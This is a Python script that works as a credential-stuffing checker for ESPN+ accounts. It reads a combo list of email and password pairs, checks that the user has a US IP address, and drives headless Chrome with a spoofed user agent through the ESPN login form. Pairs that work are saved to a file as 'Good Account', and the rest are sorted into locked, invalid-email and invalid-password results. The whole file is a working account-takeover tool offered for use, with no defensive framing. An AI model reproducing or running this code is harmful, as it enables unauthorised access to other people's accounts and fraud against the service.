import time

from headers.espn_plus import header
from selenium.webdriver.common.by import By
from combo_splitters.split_combos import ComboSplitter
from modules.connection_error import connection_error_try_block as ip_country
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import ElementClickInterceptedException, TimeoutException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path


def espn():
	header()
	index =0
	file_directory = str(Path(__file__).parents[1])+'/espn'
	plain_directory = str(Path(__file__).parents[1])
	page = 'https://plus.espn.com/'
	ip, country = ip_country()
	if 'US' not in str(country):
		print('Current IP: {}'.format(str(ip)))
		print('Current Location: {}'.format(country))
		print('Please use a US IP to check accounts.\nEnding.')
		exit()
	splitter = ComboSplitter(file_directory, "espn")
	try:
		users, passwords = splitter.split_file()
	except TypeError:
		splitter.return_error()
		exit()
	browser_options = Options()
	browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
	browser_options.add_argument('--headless=new')
	while index < len(users):
		with open(plain_directory + '/accounts/espn_acc', 'a') as account_results:
			try:
				print('\rTrying combo {} out of {}'.format(str(index + 1), len(users)), end='')
				browser = webdriver.Chrome(options = browser_options)
				browser.set_window_size(200, 200)
				browser.set_page_load_timeout(20)
				browser.get(page)
				time.sleep(5)
				login_button = browser.find_element(By.XPATH, '//*[@id="root"]/nav/div[3]/button')
				login_button.click()
				time.sleep(2)
				iframe = browser.find_element(By.NAME, 'oneid-iframe')
				browser.switch_to.frame(iframe)
				email = browser.find_element(By.XPATH, '//*[@id="InputIdentityFlowValue"]')
				email.send_keys(users[index])
				time.sleep(1)
				continue_button = browser.find_element(By.XPATH, '//*[@id="BtnSubmit"]')
				continue_button.click()
				time.sleep(1)
				if browser.find_elements(By.XPATH, '//*[@id="InputIdentityFlowValue-error"]'):
					print(" | {}: {} | ---> Invalid Email".format(users[index], passwords[index]))
				if browser.find_elements(By.XPATH, '//*[@id="InputPassword"]'):
					password = browser.find_element(By.XPATH, '//*[@id="InputPassword"]')
					password.send_keys(passwords[index])
					login = browser.find_element(By.XPATH, '//*[@id="BtnSubmit"]')
					login.click()
					time.sleep(5)
					if 'https://www.espn.com/watch/espnplus/' in browser.current_url:
						print(" | {}: {} | ---> Success!".format(users[index], passwords[index]))
						account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))
					if browser.find_elements(By.XPATH, '//*[@id="TextBlock"]'):
						print(" | {}: {} | ---> Account Locked/OTP".format(users[index], passwords[index]))
					if browser.find_elements(By.XPATH, '//*[@id="LoginError"]'):
						print(" | {}: {} | ---> Invalid Password".format(users[index], passwords[index]))
				browser.close()
				index += 1
			except ElementClickInterceptedException:
				print(' |  --> Intercepted, Index not incremented')
				browser.close()
				continue
			except TimeoutException:
				print(' |  --> Timed out. Index not incremented.')
				browser.close()
				continue
			except NoSuchElementException:
				print(' |  --> Page not Loaded')
				browser.close()
				continue
